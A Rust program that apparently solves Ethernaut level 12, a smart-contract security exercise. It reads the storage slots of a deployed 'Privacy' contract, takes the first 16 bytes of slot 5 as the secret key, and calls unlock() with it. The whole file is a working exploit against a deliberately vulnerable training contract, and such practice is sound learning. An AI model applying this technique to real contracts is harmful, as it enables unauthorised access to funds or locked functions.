use alloy::primitives::B128;
#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract Privacy {
        function locked() external view returns (bool);
        function unlock(bytes16 _key) public;
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level12_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level12())?;

    Ok(())
}

async fn level12() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let privacy_address = "0xE242f00887F16EC3fD9daBE18217B4111C187ff1".parse()?;
    let privacy = Privacy::new(privacy_address, provider.clone());
    
    println!("[CHECK]");
    let locked = privacy.locked().call().await?;
    println!("[Privacy.locked()]    locked = {locked}");
    let slot0 = provider
        .get_storage_at(privacy_address, U256::from(0))
        .await?;
    let slot1 = provider
        .get_storage_at(privacy_address, U256::from(1))
        .await?;
    let slot2 = provider
        .get_storage_at(privacy_address, U256::from(2))
        .await?;
    let slot3 = provider
        .get_storage_at(privacy_address, U256::from(3))
        .await?;
    let slot4 = provider
        .get_storage_at(privacy_address, U256::from(4))
        .await?;
    let slot5 = provider
        .get_storage_at(privacy_address, U256::from(5))
        .await?;
    println!("[Privacy.slot0]    slot0   = {:064x}", slot0);
    println!("[Privacy.slot1]    slot1   = {:064x}", slot1);
    println!("[Privacy.slot2]    slot2   = {:064x}", slot2);
    println!("[Privacy.slot3]    slot3   = {:064x}", slot3);
    println!("[Privacy.slot4]    slot4   = {:064x}", slot4);
    println!("[Privacy.slot5]    slot5   = {:064x}\n", slot5);
 
    let data_bytes = slot5.to_be_bytes::<32>();
    let key: [u8; 16] = data_bytes[0..16].try_into()?;
    let key = B128::from_slice(&key);

    let unlock_tx = privacy.unlock(key)
        .send()
        .await?;
    println!("[Privacy.unlock()]    Panding transaction... {}",
        unlock_tx.tx_hash()
    );

    let unlock_receipt = unlock_tx.get_receipt().await?;
    println!(
        "[Privacy.unlock()]    transaction included in block {}\n",
        unlock_receipt.block_number.expect("Failed to get block number")
    );

    println!("[CHECK]");
    let locked = privacy.locked().call().await?;
    println!("[Privacy.locked()]    locked = {locked}");
    
    Ok(())
}

